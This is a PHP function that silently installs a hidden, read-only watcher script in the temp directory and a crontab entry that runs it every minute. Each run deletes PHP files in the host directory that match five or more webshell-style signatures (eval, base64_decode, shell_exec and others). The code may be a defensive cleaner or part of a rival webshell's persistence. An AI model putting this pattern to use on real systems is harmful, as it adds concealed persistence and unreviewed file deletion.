function ds_install_cron() {
    global $ds_self_path, $ds_suffix;
    $cron_cmd = 'which crontab 2>/dev/null';
    $has_cron = trim(@shell_exec($cron_cmd));
    if (!$has_cron) return;
    $current_cron = @shell_exec('crontab -l 2>/dev/null') ?? '';
    $cron_marker = '# DS_WATCHER_' . $ds_suffix;
    if (strpos($current_cron, $cron_marker) === false) {
        $watch_dir = dirname($ds_self_path);
        $watch_script = sys_get_temp_dir() . '/.ds_cron_' . $ds_suffix . '.php';
        $script = '<?php
$dir = ' . var_export($watch_dir, true) . ';
$self = ' . var_export($ds_self_path, true) . ';
$sig = ["eval(", "base64_decode", "system(", "shell_exec(", "passthru(", "exec(", "gzinflate", "assert(", "preg_replace", "create_function", "call_user_func", "proc_open(", "popen("];
$files = @scandir($dir);
if ($files) {
    foreach ($files as $f) {
        if ($f === "." || $f === "..") continue;
        $fp = $dir . "/" . $f;
        if (!is_file($fp)) continue;
        if (realpath($fp) === realpath($self)) continue;
        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
        if (!in_array($ext, ["php","php3","php4","php5","phtml","php7","php8"])) continue;
        $content = @file_get_contents($fp, false, null, 0, 20480);
        if ($content === false) continue;
        $hits = 0;
        foreach ($sig as $s) { if (strpos($content, $s) !== false) $hits++; }
        if ($hits >= 5) { @unlink($fp); @error_log("DS_CRON: Removed $fp", 0); }
    }
}
';
        file_put_contents($watch_script, $script);
        @chmod($watch_script, 0444);
        $new_cron = $current_cron . "\n" . $cron_marker . "\n* * * * * php " . escapeshellarg($watch_script) . " >/dev/null 2>&1\n";
        @exec('echo ' . escapeshellarg($new_cron) . ' | crontab - 2>/dev/null');
    }
}
